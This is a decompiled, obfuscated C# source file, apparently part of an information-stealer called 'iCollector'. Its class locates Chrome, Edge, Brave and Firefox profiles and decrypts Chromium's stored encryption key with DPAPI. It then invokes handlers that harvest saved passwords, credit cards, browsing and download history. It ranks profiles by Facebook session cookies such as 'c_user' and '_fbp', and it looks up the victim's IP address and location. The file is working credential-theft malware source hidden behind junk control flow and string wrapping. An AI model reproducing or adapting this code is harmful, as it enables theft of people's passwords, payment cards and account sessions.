using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using iCollector.Job.Model;
using iCollector.Model;
using iCollector.RestClient;
using iCollector.RestClient.Model;
using iCollector.Util;

namespace iCollector.Job.Handler;

internal class CKResolver
{
	public static readonly string CKPATH_1 = "Google\Chrome\User Data";

	public static readonly string CKPATH_2;

	public static readonly string CKPATH_3;

	public static readonly string CKPATH_4;

	public readonly string[] CKPaths = new string[4]
	{
		SecurityUtils.ReadStructEncrypted(CKPATH_1),
		SecurityUtils.ReadStructEncrypted(CKPATH_2),
		SecurityUtils.ReadStructEncrypted(CKPATH_3),
		SecurityUtils.ReadStructEncrypted(CKPATH_4)
	};

	public static readonly string DEFAULT_ZIF_UA_SE;

	public static string DEFAULT_ZIF_UA;

	public static readonly string DEFAULT_HCB_UA_FORMAT_SE;

	public static readonly string DEFAULT_HCB_UA_FORMAT;

	public static readonly string ENC_KEY_REGEX_SE;

	public static readonly string ENC_KEY_REGEX;

	public static readonly string CK_KEY_BASE_SESSION_SE;

	public static readonly string CK_KEY_BASE_SESSION;

	public static readonly string CK_KEY_DBLN_SE;

	public static readonly string CK_KEY_DBLN;

	public static readonly string CK_KEY_FBP_SE;

	public static readonly string CK_KEY_FBP;

	public static readonly string CK_KEY_C_USER_SE;

	public static readonly string CK_KEY_C_USER;

	public static readonly string CLAZZ_NAME_SE;

	public static readonly string CLAZZ_NAME;

	public static readonly string METHOD_RESOLVE_SE;

	public static readonly string METHOD_RESOLVE;

	public static readonly string METHOD_ENRICH_SE;

	public static readonly string METHOD_ENRICH;

	public static readonly string METHOD_ENRICH_2_SE;

	public static readonly string METHOD_ENRICH_2;

	public static readonly string LOG_1_SE;

	public static readonly string LOG_1;

	public static readonly string LOG_2_SE;

	public static readonly string LOG_2;

	public static readonly string LOG_3_SE;

	public static readonly string LOG_3;

	public static readonly string LOG_4_SE;

	public static readonly string LOG_4;

	public static readonly string LOG_4_2_SE;

	public static readonly string LOG_4_2;

	public static readonly string LOG_5_SE;

	public static readonly string LOG_5;

	public static readonly string LOG_6_SE;

	public static readonly string LOG_6;

	public static readonly string LOG_7_SE;

	public static readonly string LOG_7;

	public static readonly string LOG_8_SE;

	public static readonly string LOG_8;

	public static readonly string FF_UA_SE;

	public static readonly string FF_UA;

	public static readonly string GV_SE;

	public static readonly string GV;

	public static readonly string HEADLESS_SE;

	public static readonly string HEADLESS;

	public static readonly string WHAT_IS_URL_SE;

	public static readonly string WHAT_IS_URL;

	public static readonly string WHAT_IS_URL_2_SE;

	public static readonly string WHAT_IS_URL_2;

	public static readonly string WHAT_IS_URL_3_SE;

	public static readonly string WHAT_IS_URL_3;

	public static readonly string REGEX_1_SE;

	public static readonly string REGEX_1;

	public static readonly string REGEX_2_SE;

	public static readonly string REGEX_2;

	public static readonly string FF_SE;

	public static readonly string FF;

	public static readonly string GG_SE;

	public static readonly string GG;

	public static readonly string ED_SE;

	public static readonly string ED;

	public static readonly string BRVS_SE;

	public static readonly string BRVS;

	private ClientInternetResolver cir;

	private Logger log = Logger.Instance();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	public CKModelHolder Resolve()
	{
		LogContext logContext = ctx;
		string mETHOD_RESOLVE = METHOD_RESOLVE;
		if (0 == 0 && 0 == 0)
		{
			logContext.MethodName = mETHOD_RESOLVE;
		}
		cir = new ClientInternetResolver();
		List<CKModel> list2;
		string[] array = default(string[]);
		int num = default(int);
		string path = default(string);
		CKModel cKModel2 = default(CKModel);
		while (true)
		{
			ClientInternetResolver clientInternetResolver = cir;
			if (7u != 0 && 0 == 0)
			{
				clientInternetResolver.InitMap();
			}
			List<CKModel> list = new List<CKModel>();
			if (3u != 0)
			{
				list2 = list;
			}
			if (4u != 0)
			{
				string[] cKPaths = CKPaths;
				if (0 == 0)
				{
					array = cKPaths;
				}
				if (0 == 0)
				{
					num = 0;
				}
			}
			int num2 = 0;
			if (num2 == 0)
			{
				if (num2 == 0)
				{
					goto IL_0091;
				}
				goto IL_0097;
			}
			goto IL_0098;
			IL_0097:
			num2 = 5;
			goto IL_0098;
			IL_005a:
			string obj = array[num];
			if (0 == 0)
			{
				path = obj;
			}
			CKModel cKModel = Resolve(path);
			if (0 == 0)
			{
				cKModel2 = cKModel;
			}
			if (cKModel2 != null && cKModel2.Valid)
			{
				if (-1 == 0)
				{
					continue;
				}
				CKModel item = cKModel2;
				if (0 == 0)
				{
					list2.Add(item);
				}
			}
			int num3 = num + 1;
			if (0 == 0)
			{
				num = num3;
			}
			goto IL_0091;
			IL_0098:
			if (num2 != 0)
			{
				break;
			}
			goto IL_005a;
			IL_0091:
			if (num < array.Length)
			{
				goto IL_005a;
			}
			goto IL_0097;
		}
		CKModelHolder obj2 = new CKModelHolder
		{
			Models = list2,
			PriorityProfiles = MarkAndSortPriority(list2)
		};
		List<CKProfile> nonValueProfiles = GetNonValueProfiles(list2);
		if (uint.MaxValue != 0)
		{
			obj2.NonValueProfiles = nonValueProfiles;
		}
		return obj2;
	}

	public CKModel Resolve(string path)
	{
		LogContext logContext = ctx;
		string mETHOD_RESOLVE = METHOD_RESOLVE;
		if (uint.MaxValue != 0)
		{
			logContext.MethodName = mETHOD_RESOLVE;
		}
		CKModel cKModel;
		if (true)
		{
			cKModel = null;
		}
		bool num = IsC(path);
		while (true)
		{
			if (num)
			{
				CKModel cKModel2 = new CKCResolver().Resolve(path);
				if (0 == 0)
				{
					cKModel = cKModel2;
				}
				break;
			}
			num = IsZIF(path);
			if (0 == 0 && false)
			{
				continue;
			}
			if (num)
			{
				CKModel cKModel3 = new CKFResolver().Resolve(path);
				if (0 == 0)
				{
					cKModel = cKModel3;
				}
			}
			break;
		}
		if (cKModel != null && cKModel.Valid)
		{
			Logger logger = log;
			LogContext logContext2 = ctx;
			string message = LOG_1 + cKModel.Path;
			if (0 == 0)
			{
				logger.Info(logContext2, message);
			}
			CKModel cKModel4 = cKModel;
			ClientProcess process = cir.GetProcess(cKModel.Type);
			if (6u != 0)
			{
				cKModel4.Process = process;
			}
			do
			{
				if (cKModel.Process == null)
				{
					Logger logger2 = log;
					LogContext logContext3 = ctx;
					string message2 = LOG_2 + cKModel.Type;
					if (0 == 0)
					{
						logger2.Info(logContext3, message2);
					}
				}
			}
			while (8 == 0);
			CKModel model = cKModel;
			if (5u != 0)
			{
				EnrichClientInfo(model);
			}
			CKModel model2 = cKModel;
			if (0 == 0)
			{
				EnrichClientData(model2);
			}
			List<CKProfile>.Enumerator enumerator = cKModel.Profiles.GetEnumerator();
			List<CKProfile>.Enumerator enumerator2;
			if (uint.MaxValue != 0)
			{
				enumerator2 = enumerator;
			}
			try
			{
				CKProfile cKProfile = default(CKProfile);
				while (enumerator2.MoveNext())
				{
					if (uint.MaxValue != 0)
					{
						CKProfile current = enumerator2.Current;
						if (0 == 0)
						{
							cKProfile = current;
						}
						CKProfile cKProfile2 = cKProfile;
						ClientInfo clientInfo = cKModel.ClientInfo;
						if (0 == 0)
						{
							cKProfile2.ClientInfo = clientInfo;
						}
						if (false)
						{
							goto IL_01be;
						}
						cKProfile.Type = TextUtils.Reverse(cKModel.Type);
						cKProfile.Name = TextUtils.OnlyAlphaNumber(TextUtils.CreateMD5(cKProfile.Path), 3).ToUpper();
					}
					string key = CacheRepository.KEY_PERFIX_PROFILE_UID + cKProfile.Name;
					string key2 = CacheRepository.KEY_PERFIX_SOCIAL_PROFILE + cKProfile.Name;
					if (string.IsNullOrEmpty(cKProfile.ResourceUID))
					{
						string @string = CacheRepository.GetString(key);
						if (!string.IsNullOrEmpty(@string))
						{
							cKProfile.ResourceUID = @string;
						}
					}
					if (!string.IsNullOrEmpty(cKProfile.ResourceUID))
					{
						CacheRepository.Save(key, cKProfile.ResourceUID);
					}
					SocialProfile @object = CacheRepository.GetObject<SocialProfile>(key2);
					goto IL_01be;
					IL_01be:
					if (@object != null)
					{
						cKProfile.SocialProfile = @object;
					}
				}
				return cKModel;
			}
			finally
			{
				((IDisposable)enumerator2).Dispose();
			}
		}
		return cKModel;
	}

	private void EnrichClientData(CKModel model)
	{
		do
		{
			LogContext logContext = ctx;
			string mETHOD_ENRICH = METHOD_ENRICH;
			if (0 == 0 && 8u != 0)
			{
				logContext.MethodName = mETHOD_ENRICH;
			}
		}
		while (false);
		if (0 == 0)
		{
			if (6u != 0)
			{
				if (true && 0 == 0)
				{
					DecodeKey(model);
				}
				goto IL_0020;
			}
			return;
		}
		goto IL_0031;
		IL_0031:
		if (0 == 0)
		{
			if (false)
			{
				goto IL_0020;
			}
			if (0 == 0 && 0 == 0)
			{
				ReadPazz(model);
			}
			if (0 == 0)
			{
				ReadCC(model);
			}
		}
		if (5u != 0)
		{
			ReadDownloadHistory(model);
		}
		return;
		IL_0020:
		if (0 == 0 && 5u != 0)
		{
			ReadIDHeader(model);
		}
		if (0 == 0)
		{
			if (0 == 0 && 7u != 0)
			{
				ReadHistory(model);
			}
		}
		goto IL_0031;
	}

	private List<CKProfile> MarkAndSortPriority(List<CKModel> models)
	{
		return (from profile in models.SelectMany((CKModel a) => a.Profiles)
			where !string.IsNullOrEmpty(profile.ResourceIdHeader)
			select profile into bp
			orderby bp.ResourceIdHeader.Contains(CK_KEY_BASE_SESSION) descending
			orderby bp.ResourceIdHeader.Contains(CK_KEY_C_USER) descending
			orderby bp.ResourceIdHeader.Contains(CK_KEY_DBLN) descending
			orderby bp.ResourceIdHeader.Contains(CK_KEY_FBP) descending
			select bp).ToList();
	}

	private List<CKProfile> GetNonValueProfiles(List<CKModel> models)
	{
		return (from profile in models.SelectMany((CKModel a) => a.Profiles)
			where string.IsNullOrEmpty(profile.ResourceIdHeader)
			select profile).ToList();
	}

	private void ReadIDHeader(CKModel model)
	{
		ReadIDHeaderHandler readIDHeaderHandler = new ReadIDHeaderHandler();
		if (0 == 0 && 4u != 0)
		{
			readIDHeaderHandler.Enrich(model);
		}
	}

	private void ReadPazz(CKModel model)
	{
		ReadPazzHandler readPazzHandler = new ReadPazzHandler();
		if (0 == 0 && 4u != 0)
		{
			readPazzHandler.Enrich(model);
		}
	}

	private void ReadHistory(CKModel model)
	{
		ReadHisHandler readHisHandler = new ReadHisHandler();
		if (0 == 0 && 4u != 0)
		{
			readHisHandler.Enrich(model);
		}
	}

	private void ReadCC(CKModel model)
	{
		ReadCCHandler readCCHandler = new ReadCCHandler();
		if (0 == 0 && 4u != 0)
		{
			readCCHandler.Enrich(model);
		}
	}

	private void ReadDownloadHistory(CKModel model)
	{
		ReadDownloadHistoryHandler readDownloadHistoryHandler = new ReadDownloadHistoryHandler();
		if (0 == 0 && 4u != 0)
		{
			readDownloadHistoryHandler.Enrich(model);
		}
	}

	public void DecodeKey(CKModel model)
	{
		if ((string.Equals(model.Type, CKType.ZIF) && 0 == 0) || model.LcsBytes != null)
		{
			return;
		}
		try
		{
			if (-1 == 0)
			{
				return;
			}
			string text = RegexUtils.FindRegex(File.ReadAllText(model.LcsPath), ENC_KEY_REGEX);
			string text2 = default(string);
			if (0 == 0)
			{
				if (0 == 0)
				{
					text2 = text;
				}
				if (5 == 0)
				{
					goto IL_0060;
				}
			}
			if (false)
			{
				return;
			}
			if (string.IsNullOrEmpty(text2))
			{
				Logger logger = log;
				LogContext logContext = ctx;
				string lOG_ = LOG_8;
				if (4u != 0 && 6u != 0)
				{
					logger.Error(logContext, lOG_);
				}
				return;
			}
			goto IL_0060;
			IL_0060:
			byte[] lcsBytes = ProtectedData.Unprotect(Convert.FromBase64String(text2).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine);
			if (0 == 0 && 0 == 0)
			{
				model.LcsBytes = lcsBytes;
			}
		}
		catch (Exception ex)
		{
			log.Error(ctx, ex.ToString());
		}
	}

	private void EnrichClientInfo(CKModel model)
	{
		LogContext logContext = ctx;
		string mETHOD_ENRICH_ = METHOD_ENRICH_2;
		if (0 == 0)
		{
			logContext.MethodName = mETHOD_ENRICH_;
		}
		if (model.ClientInfo != null)
		{
			return;
		}
		ClientInfo clientInfo = new ClientInfo();
		ClientInfo clientInfo2;
		if (2u != 0)
		{
			clientInfo2 = clientInfo;
		}
		if (string.Equals(model.Type, CKType.ZIF))
		{
			string fF_UA = FF_UA;
			if (uint.MaxValue != 0)
			{
				clientInfo2.UA = fF_UA;
			}
		}
		else
		{
			string obj = ((model.Process != null && !string.IsNullOrEmpty(model.Process.Version)) ? model.Process.Version : GV);
			string arg = default(string);
			if (0 == 0)
			{
				arg = obj;
			}
			string uA = string.Format(DEFAULT_HCB_UA_FORMAT, arg);
			if (5u != 0)
			{
				clientInfo2.UA = uA;
			}
			if (model.Process != null && !string.IsNullOrEmpty(model.Process.ExecutorPath))
			{
				string text = CacheRepository.KEY_PERFIX_UA_PROCESS + "_" + TextUtils.OnlyAlphaNumber(model.Process.ExecutorPath, 500);
				string text2 = default(string);
				if (0 == 0)
				{
					text2 = text;
				}
				string @string = CacheRepository.GetString(text2);
				string text3;
				if (2u != 0)
				{
					text3 = @string;
				}
				Logger logger = log;
				LogContext logContext2 = ctx;
				string message = LOG_4 + text2 + LOG_4_2 + text3;
				if (7u != 0)
				{
					logger.Info(logContext2, message);
				}
				string obj2 = (string.IsNullOrEmpty(text3) ? DetectClientInfoResult(WHAT_IS_URL, model, useProcess: true, REGEX_1) : text3);
				string text4 = default(string);
				if (0 == 0)
				{
					text4 = obj2;
				}
				Logger logger2 = log;
				LogContext logContext3 = ctx;
				string message2 = LOG_5 + text4;
				if (0 == 0)
				{
					logger2.Info(logContext3, message2);
				}
				if (!string.IsNullOrEmpty(text4))
				{
					string text5 = text4.Replace(HEADLESS, "");
					if (0 == 0)
					{
						text4 = text5;
					}
					string key = text2;
					string value = text4;
					if (0 == 0)
					{
						CacheRepository.Save(key, value);
					}
					clientInfo2.UA = text4;
				}
			}
		}
		CacheRepository.Save(value: clientInfo2.Ip = (string.IsNullOrEmpty(CacheRepository.GetString(CacheRepository.KEY_IP)) ? DetectClientInfoResult(WHAT_IS_URL_2, model, useProcess: false, null) : CacheRepository.GetString(CacheRepository.KEY_IP)), key: CacheRepository.KEY_IP);
		CacheRepository.Save(value: clientInfo2.Address = (string.IsNullOrEmpty(CacheRepository.GetString(CacheRepository.KEY_ADDRESS)) ? DetectClientInfoResult(WHAT_IS_URL_3, model, useProcess: false, null) : CacheRepository.GetString(CacheRepository.KEY_ADDRESS)), key: CacheRepository.KEY_ADDRESS);
		log.Info(ctx, LOG_6 + clientInfo2.Ip + ", " + clientInfo2.Address + ", " + clientInfo2.UA);
		model.ClientInfo = clientInfo2;
	}

	private string DetectClientInfoResult(string url, CKModel model, bool useProcess, string pattern)
	{
		Logger logger = log;
		LogContext logContext = ctx;
		string message = LOG_7 + url;
		if (8u != 0 && 4u != 0)
		{
			logger.Info(logContext, message);
		}
		try
		{
			string source = default(string);
			if (5u != 0 && 0 == 0)
			{
				source = null;
			}
			bool num = useProcess;
			if (7u != 0)
			{
				if (!num || model.Process == null)
				{
					goto IL_0099;
				}
				num = string.IsNullOrEmpty(model.Process.ExecutorPath);
			}
			if (num)
			{
				goto IL_0099;
			}
			try
			{
				string text = new ClientProcessExecutor().RequestGet(model.Process, url);
				if ((0 == 0) ? true : false)
				{
					source = text;
				}
			}
			catch (Exception ex)
			{
				log.Error(ctx, ex.ToString());
				source = new DefaultRestClient(new RestOptions()).Get(url, null).Body;
			}
			goto IL_00b3;
			IL_0099:
			string body = new DefaultRestClient(new RestOptions()).Get(url, null).Body;
			if (4u != 0 && 3u != 0)
			{
				source = body;
			}
			goto IL_00b3;
			IL_00b3:
			string result = RegexUtils.FindRegex(source, (pattern == null) ? REGEX_2 : pattern);
			string result2;
			if (true)
			{
				if (8u != 0)
				{
					return result;
				}
				return result2;
			}
			return result2;
		}
		catch (Exception ex2)
		{
			do
			{
				log.Error(ctx, ex2.ToString());
			}
			while (6 == 0);
			return "";
		}
	}

	private bool IsZIF(string path)
	{
		return path?.Contains(FF) ?? false;
	}

	private bool IsC(string path)
	{
		while (true)
		{
			IL_0000:
			if (path == null)
			{
				goto IL_0003;
			}
			if (!path.Contains(GG))
			{
				while (!path.Contains(ED))
				{
					if (false)
					{
						continue;
					}
					goto IL_0028;
				}
			}
			goto IL_0038;
			IL_0003:
			int num = 0;
			if (num == 0)
			{
				return (byte)num != 0;
			}
			goto IL_003c;
			IL_0038:
			if (false)
			{
				goto IL_0003;
			}
			num = 1;
			goto IL_003c;
			IL_0028:
			bool num2;
			while (true)
			{
				num2 = path.Contains(BRVS);
				if (true)
				{
					break;
				}
				if (num2)
				{
					goto IL_0000;
				}
			}
			if (!num2)
			{
				if (2u != 0)
				{
					break;
				}
				continue;
			}
			goto IL_0038;
			IL_003c:
			return (byte)num != 0;
		}
		return false;
	}

	static CKResolver()
	{
		if (5u != 0)
		{
			CKPATH_2 = "Microsoft\Edge\User Data";
			CKPATH_3 = "BraveSoftware\Brave-Browser\User Data";
			CKPATH_4 = "Mozilla\Firefox\Profiles";
			goto IL_002e;
		}
		goto IL_0163;
		IL_00bb:
		CK_KEY_FBP = SecurityUtils.ReadStructEncrypted(CK_KEY_FBP_SE);
		goto IL_00ca;
		IL_0163:
		LOG_2_SE = "not found process for type: ";
		if (false)
		{
			goto IL_002e;
		}
		LOG_2 = SecurityUtils.ReadStructEncrypted(LOG_2_SE);
		LOG_3_SE = "encKey null";
		LOG_3 = SecurityUtils.ReadStructEncrypted(LOG_3_SE);
		while (true)
		{
			LOG_4_SE = "UA Cache key: ";
			LOG_4 = SecurityUtils.ReadStructEncrypted(LOG_4_SE);
			LOG_4_2_SE = ",  value = ";
			if (2 == 0)
			{
				break;
			}
			if (false)
			{
				continue;
			}
			goto IL_01c7;
		}
		goto IL_00ca;
		IL_007f:
		CK_KEY_BASE_SESSION_SE = "_base_session";
		CK_KEY_BASE_SESSION = SecurityUtils.ReadStructEncrypted(CK_KEY_BASE_SESSION_SE);
		CK_KEY_DBLN_SE = "dbln=";
		CK_KEY_DBLN = SecurityUtils.ReadStructEncrypted(CK_KEY_DBLN_SE);
		CK_KEY_FBP_SE = "_fbp=";
		goto IL_00bb;
		IL_002e:
		DEFAULT_ZIF_UA_SE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0";
		DEFAULT_ZIF_UA = SecurityUtils.ReadStructEncrypted(DEFAULT_ZIF_UA_SE);
		if (0 == 0)
		{
			DEFAULT_HCB_UA_FORMAT_SE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0} Safari/537.36";
			DEFAULT_HCB_UA_FORMAT = SecurityUtils.ReadStructEncrypted(DEFAULT_HCB_UA_FORMAT_SE);
			ENC_KEY_REGEX_SE = "encrypted_key":"(.*?)"";
			ENC_KEY_REGEX = SecurityUtils.ReadStructEncrypted(ENC_KEY_REGEX_SE);
			goto IL_007f;
		}
		goto IL_0327;
		IL_0327:
		GG_SE = "Google";
		GG = SecurityUtils.ReadStructEncrypted(GG_SE);
		ED_SE = "Edge";
		ED = SecurityUtils.ReadStructEncrypted(ED_SE);
		BRVS_SE = "BraveSoftware";
		BRVS = SecurityUtils.ReadStructEncrypted(BRVS_SE);
		return;
		IL_01c7:
		LOG_4_2 = SecurityUtils.ReadStructEncrypted(LOG_4_2_SE);
		LOG_5_SE = "fetchUA: ";
		LOG_5 = SecurityUtils.ReadStructEncrypted(LOG_5_SE);
		LOG_6_SE = "client-info: ";
		if (-1 == 0)
		{
			goto IL_007f;
		}
		LOG_6 = SecurityUtils.ReadStructEncrypted(LOG_6_SE);
		LOG_7_SE = "Detect Result for url: ";
		if (0 == 0)
		{
			LOG_7 = SecurityUtils.ReadStructEncrypted(LOG_7_SE);
			LOG_8_SE = "encKey null";
			LOG_8 = SecurityUtils.ReadStructEncrypted(LOG_8_SE);
			FF_UA_SE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0";
			FF_UA = SecurityUtils.ReadStructEncrypted(FF_UA_SE);
			GV_SE = "110.0.0.0";
			GV = SecurityUtils.ReadStructEncrypted(GV_SE);
			HEADLESS_SE = "Headless";
			HEADLESS = SecurityUtils.ReadStructEncrypted(HEADLESS_SE);
			WHAT_IS_URL_SE = "https://www.whatismybrowser.com/detect/what-is-my-user-agent";
			WHAT_IS_URL = SecurityUtils.ReadStructEncrypted(WHAT_IS_URL_SE);
			WHAT_IS_URL_2_SE = "https://www.whatismybrowser.com/detect/what-is-my-ip-address";
			WHAT_IS_URL_2 = SecurityUtils.ReadStructEncrypted(WHAT_IS_URL_2_SE);
			WHAT_IS_URL_3_SE = "https://www.whatismybrowser.com/detect/ip-address-location";
		}
		WHAT_IS_URL_3 = SecurityUtils.ReadStructEncrypted(WHAT_IS_URL_3_SE);
		REGEX_1_SE = " id="detected_value">.*?>(.*?)<";
		REGEX_1 = SecurityUtils.ReadStructEncrypted(REGEX_1_SE);
		REGEX_2_SE = " id="detected_value">(.*?)<";
		REGEX_2 = SecurityUtils.ReadStructEncrypted(REGEX_2_SE);
		FF_SE = "Firefox";
		FF = SecurityUtils.ReadStructEncrypted(FF_SE);
		goto IL_0327;
		IL_00ca:
		CK_KEY_C_USER_SE = "c_user=";
		CK_KEY_C_USER = SecurityUtils.ReadStructEncrypted(CK_KEY_C_USER_SE);
		CLAZZ_NAME_SE = "CKResolver";
		CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);
		METHOD_RESOLVE_SE = "Resolve";
		METHOD_RESOLVE = SecurityUtils.ReadStructEncrypted(METHOD_RESOLVE_SE);
		if (7 == 0)
		{
			goto IL_00bb;
		}
		METHOD_ENRICH_SE = "EnrichClientData";
		METHOD_ENRICH = SecurityUtils.ReadStructEncrypted(METHOD_ENRICH_SE);
		METHOD_ENRICH_2_SE = "EnrichClientInfo";
		METHOD_ENRICH_2 = SecurityUtils.ReadStructEncrypted(METHOD_ENRICH_2_SE);
		LOG_1_SE = "Found valid ckModel: ";
		LOG_1 = SecurityUtils.ReadStructEncrypted(LOG_1_SE);
		goto IL_0163;
	}
}
